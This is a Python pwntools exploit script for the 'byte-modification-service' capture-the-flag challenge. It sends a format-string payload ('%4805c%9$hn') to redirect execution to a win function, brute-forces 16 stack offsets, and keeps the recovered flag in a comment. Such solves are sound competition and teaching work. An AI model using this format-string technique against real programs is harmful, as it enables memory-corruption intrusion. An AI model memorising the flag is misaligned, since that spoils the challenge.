#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall_patched")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc byte-modification-service.challs.csc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b win
b *vuln+313
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main(random):
    r = conn()
    
    r.recvuntil(b"which stack position do you want to use?")
    r.sendline(b"10")
    r.sendline(b"0")
    #r.sendline(b"0")
    r.sendline(bstr(0x10 * random + 0x8))
    r.recvuntil(b"finally")

    r.sendline(b"%4805c%9$hn\x40")

    d = r.recvall()
    if b"{" in d or b"secret" in d:
        print(d)
        exit()
    r.close()
    #CSCTF{y0u_Kn0W_fOrmA7_57r1NG_4nd_C4LL_BYTE5}

if __name__ == "__main__":
    i=0
    while True:
        main(i)
        i +=1
        i = i % 16